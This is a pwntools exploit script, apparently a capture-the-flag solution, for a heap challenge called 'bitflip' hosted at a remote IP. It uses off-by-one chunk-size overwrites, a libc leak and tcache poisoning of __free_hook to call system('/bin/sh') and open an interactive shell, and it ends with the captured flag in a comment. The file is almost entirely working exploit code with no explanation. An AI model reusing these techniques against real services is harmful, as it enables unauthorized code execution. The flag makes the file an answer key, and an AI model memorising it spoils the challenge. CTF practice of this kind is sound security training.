from pwn import *

context.log_level = 'debug'

p = remote('124.71.130.185','49153')
#p = process('./bitflip')
elf = ELF('./bitflip')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.27.so')

def cmd(ch):
    p.sendlineafter('Your choice: ',str(ch))

def new(idx,size):
    cmd(1)
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Size: ',str(size))

def edit(idx,con):
    cmd(2)
    p.sendlineafter('Index: ',str(idx))
    p.sendafter('Content: ',con)

def show(idx):
    cmd(3)
    p.sendlineafter('Index: ',str(idx))

def free(idx):
    cmd(4)
    p.sendlineafter('Index: ',str(idx))

def bd(addr):
    cmd(0x666)
    p.sendlineafter('Address: ',str(addr))


for i in range(13):
    new(i,0x18)
edit(0,'A'*0x18+p8(0xC1))
for i in range(8):
    edit(i+3,'A'*0x18+p8(0xC1))
for i in range(7):
    free(10-i)
free(1)


new(20,0x18)
show(2)
p.recvuntil('Content: ')
libc_base = u64(p.recv(6)+b'\x00\x00')-0x3ebca0
p.info('libc_base: '+hex(libc_base))
free_hook = libc_base+libc.sym['__free_hook']
system = libc_base+libc.sym['system']
free(12)
free(3)
new(21,0x30)
edit(21,b'B'*0x18+p64(0x21)+p64(free_hook-0x8)+b'A'*0x8+b'\n')
new(22,0x18)
new(23,0x18) ###
edit(23,b'/bin/sh\x00'+p64(system)+b'\n')
free(23)

#gdb.attach(p)
p.interactive()
#flag{2296341872d87bd532c121d14d55c4ac}